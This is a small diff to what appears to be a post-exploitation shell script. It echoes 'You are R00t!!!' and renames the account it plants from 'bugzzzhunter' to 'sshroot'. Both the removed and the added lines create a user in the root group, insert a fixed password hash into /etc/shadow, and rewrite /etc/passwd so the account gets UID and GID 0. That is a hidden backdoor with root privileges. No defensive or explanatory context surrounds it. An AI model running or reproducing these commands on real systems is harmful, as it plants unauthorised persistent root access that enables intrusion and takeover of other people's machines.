@@ -1,5 +1,5 @@
 
 ncecho '[*]You are R00t!!!'
-adduser -s /bin/sh -D -H -G root bugzzzhunter
-sed -i 's#bugzzzhunter:!:#bugzzzhunter:$1$pTOIYZdJ$qNjIhQxJIymF.8vSkrfr50:#g' /etc/shadow
-sed -i -e 's/^\(bugzzzhunter:[^:]\):[0-9]*:[0-9]*:/\1:0:0:/' /etc/passwd
+adduser -s /bin/sh -D -H -G root sshroot
+sed -i 's#sshroot:!:#sshroot:$1$lm91T48j$cx8P5zCexPS62DXz9lOlH1:#g' /etc/shadow
+sed -i -e 's/^\(sshroot:[^:]\):[0-9]*:[0-9]*:/\1:0:0:/' /etc/passwd
